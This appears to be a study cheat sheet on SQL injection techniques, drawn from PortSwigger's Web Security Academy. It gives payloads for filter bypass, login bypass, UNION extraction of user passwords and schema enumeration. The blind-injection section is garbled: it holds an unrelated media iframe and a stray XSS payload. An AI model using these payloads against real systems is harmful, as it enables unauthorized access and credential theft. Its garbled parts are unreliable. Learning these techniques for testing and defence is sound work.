There are wide variety of SQL injection vulnerabilities:
```
' or 1=1--
' or 1=1 -- -
```
* [Retrieving hidden data](https://portswigger.net/web-security/sql-injection#retrieving-hidden-data): where you can modify an SQL query to return additional results.
```
https://insecure-website.com/products?category=Gifts'-- (SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1)
https://insecure-website.com/products?category=Gifts'+OR+1=1-- (SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1)
```

* [Subverting application logic](https://portswigger.net/web-security/sql-injection#subverting-application-logic): where you can change a query to interfere with the application's logic.Consider an application that lets users log in with a username and password. If a user submits the username wiener and the password bluecheese, the application checks the credentials by performing the following SQL query:
```
SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese' >> administrator'-- (SELECT * FROM users WHERE username = 'administrator'--' AND password = '')
```
* [UNION attacks](https://portswigger.net/web-security/sql-injection/union-attacks), where you can retrieve data from different database tables.
```
' UNION SELECT username, password FROM users--
```
* [Examining the database](https://portswigger.net/web-security/sql-injection/examining-the-database), where you can extract information about the version and structure of the database.Following initial identification of an SQL injection vulnerability, it is generally useful to obtain some information about the database itself. This information can often pave the way for further exploitation.
```
SELECT * FROM information_schema.tables
SELECT * FROM $version
```

* [Blind SQL injection](https://portswigger.net/web-security/sql-injection/blind) where the results of a query you control are not returned in the application's responses.
```
  ́ OR 1=1 --
  <iframe width="100%" height="166" scrolling="no" frameborder="no" allow="autoplay" src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/‐ 771984076&color=%23ff5500&auto_play=true&hide_related=false&show_comments=true&show iframe>
  <iframe src="javascript:alert(`xss`)">
```
